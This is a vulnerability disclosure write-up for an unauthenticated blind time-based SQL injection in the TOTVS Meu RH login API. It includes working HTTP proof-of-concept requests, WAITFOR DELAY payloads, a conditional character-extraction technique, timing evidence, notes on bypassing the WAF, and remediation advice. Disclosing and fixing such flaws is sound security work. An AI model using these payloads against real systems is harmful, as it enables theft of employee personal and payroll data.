# CVE-XXXX-YYYY – Blind Time-Based SQL Injection in TOTVS Meu RH REST API

> **Severity:** 🔴 **Critical** (CVSS v3.1: **9.1**)  
> **Confidence:** ✅ Confirmed  
> **CWE:** CWE-89 – SQL Injection  
> **OWASP Top 10:** A03:2021 – Injection

---

# Summary

The authentication endpoint **`/rest/auth/login`** exposed on **TCP port 9197** is vulnerable to **Blind Time-Based SQL Injection** through the JSON parameter **`user`**.

The vulnerability allows unauthenticated attackers to execute **stacked SQL queries** against a **Microsoft SQL Server 2022** backend by abusing the `WAITFOR DELAY` statement, enabling arbitrary inference-based data extraction.

Testing also demonstrated that the deployed **Web Application Firewall (WAF)** blocks common **XSS** and **XXE** payloads but **does not detect or block SQL Injection payloads**, allowing exploitation without authentication.

---

# Affected Component

| Item | Value |
|------|-------|
| Product | TOTVS Meu RH |
| Endpoint | `/rest/auth/login` |
| Method | POST |
| Authentication | Not Required |
| Database | Microsoft SQL Server 2022 |
| Vulnerability | Blind Time-Based SQL Injection |
| Exploitation | Remote |

---

# Vulnerability Details

The application concatenates the value supplied in the JSON parameter `user` directly into an SQL statement.

Because **stacked queries (`;`)** are accepted by the backend, an attacker can append arbitrary SQL commands.

The following statement was successfully executed:

```sql
WAITFOR DELAY '00:00:05'
```

Execution of this statement causes a measurable delay in the HTTP response, confirming arbitrary SQL execution.

---

# Proof of Concept

## Legitimate Request

```http
POST /rest/auth/login HTTP/1.1
Host: meurh.host:9197
Content-Type: application/json
X-Totvs-App: 0200

{
  "user":"test",
  "password":"test",
  "redirectUrl":"https://meurh.host/",
  "restUrl":"https://meurh.host:9197/rest"
}
```

---

## Malicious Request

```http
POST /rest/auth/login HTTP/1.1
Host: meurh.host:9197
Content-Type: application/json
X-Totvs-App: 0200

{
  "user":"test');WAITFOR DELAY '0:0:5'--",
  "password":"test",
  "redirectUrl":"https://meurh.host/",
  "restUrl":"https://meurh.host:9197/rest"
}
```

---

## Conditional Data Extraction

The following payload demonstrates conditional execution based on database contents.

```sql
test');IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY '0:0:3'--
```

If the first character of the database name equals **ASCII 80 ("P")**, the server delays its response.

---

# Evidence

## 1. Time-Based Validation

| Payload | Response Time | Result |
|----------|--------------:|--------|
| `test` | ~0.85 s | Baseline |
| `test');WAITFOR DELAY '0:0:3'--` | ~3.98 s | SQL Executed |
| `test');WAITFOR DELAY '0:0:5'--` | ~5.98 s | SQL Executed |
| `test');WAITFOR DELAY '0:0:8'--` | ~8.82 s | SQL Executed |

The response time increases proportionally with the requested delay.

This confirms that:

- ✅ SQL Injection exists
- ✅ Stacked queries are enabled
- ✅ Microsoft SQL Server executes injected statements

---

## 2. Database Name Extraction

The vulnerability was further validated through conditional inference.

| Payload | Observation |
|----------|-------------|
| `IF ASCII(SUBSTRING(DB_NAME(),1,1))=80 WAITFOR DELAY` | Delay observed |
| `IF ASCII(SUBSTRING(DB_NAME(),2,1))<=82 WAITFOR DELAY` | Delay observed |

Recovered database name:

```text
PR...
```

This confirms that arbitrary database information can be extracted without displaying any SQL output.

---

# Extraction Technique

The extraction process uses a classic **Blind Time-Based Binary Search**.

Example logic:

```sql
IF ASCII(SUBSTRING(DB_NAME(),1,1)) > 77
    WAITFOR DELAY '00:00:05'
```

Each request leaks one bit of information through response timing.

By repeating the process, an attacker can enumerate:

- Database names
- Current user
- Server version
- Tables
- Columns
- Records
- Password hashes

without any SQL error messages.

---

# WAF Analysis

Testing demonstrated inconsistent filtering.

| Payload | Result |
|---------|--------|
| XSS | HTTP 403 |
| XXE | HTTP 403 |
| SQL Injection | Accepted |

The deployed WAF does **not** detect SQL Injection patterns such as:

- `WAITFOR`
- `IF`
- `ASCII`
- `SUBSTRING`
- `;`
- Stacked queries

This allows successful exploitation despite active application protection.

---

# Technical Details

| Property | Value |
|----------|-------|
| Vulnerability | Blind Time-Based SQL Injection |
| Injection Point | JSON parameter `user` |
| Database | Microsoft SQL Server 2022 |
| Technique | Conditional Time Delay |
| Stacked Queries | Supported |
| Authentication | Not Required |
| WAF Bypass | Confirmed |

---

# Technical Impact

An unauthenticated attacker can:

- Extract the complete database schema.
- Enumerate databases using `DB_NAME()`.
- Enumerate SQL Server users (`SYSTEM_USER`).
- Dump tables from `INFORMATION_SCHEMA`.
- Extract employee records.
- Retrieve payroll information.
- Obtain personally identifiable information (PII).
- Extract password hashes.
- Modify application data through stacked queries (`INSERT`, `UPDATE`, `DELETE`).
- Execute operating system commands if `xp_cmdshell` is enabled.
- Potentially create administrative accounts within the application.

---

# Business Impact

The affected application processes **Human Resources (HR)** information.

Successful exploitation may lead to:

- Complete disclosure of employee personal information.
- Exposure of payroll and salary records.
- Leakage of confidential HR documents.
- Violation of Brazil's **LGPD**.
- Loss of confidentiality, integrity, and availability.
- Complete compromise of the application's database.

Because the application belongs to a **government-funded scientific research institution**, compromise could significantly impact operational continuity and regulatory compliance.

---

# Remediation

The following mitigations are recommended:

- **Use parameterized queries** for every database interaction.
- Never concatenate user-controlled input into SQL statements.
- Replace dynamic SQL with prepared statements.
- Use parameterized stored procedures.
- Disable stacked queries where possible.
- Restrict SQL Server permissions following the Principle of Least Privilege.
- Disable `xp_cmdshell`.
- Configure the WAF to detect:
  - `WAITFOR`
  - `SLEEP`
  - `BENCHMARK`
  - stacked query delimiters (`;`)
  - SQL keywords commonly used in injection attacks.
- Enable SQL Server auditing and monitoring for anomalous query execution.

---

# References

- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89 – Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")
- Microsoft SQL Server SQL Injection documentation

---

# Security Impact

> **Critical**

The vulnerability allows **unauthenticated remote attackers** to execute arbitrary SQL statements through stacked queries and extract sensitive database contents using time-based inference.

A fully functional extraction script was successfully developed and validated, demonstrating the ability to enumerate databases and retrieve sensitive information from the target environment.

**Confirmed capabilities include:**

- ✅ Arbitrary SQL execution
- ✅ Time-based inference
- ✅ Database enumeration
- ✅ Database name extraction (`DB_NAME()`)
- ✅ Stacked queries
- ✅ WAF bypass
- ✅ Automated extraction
```
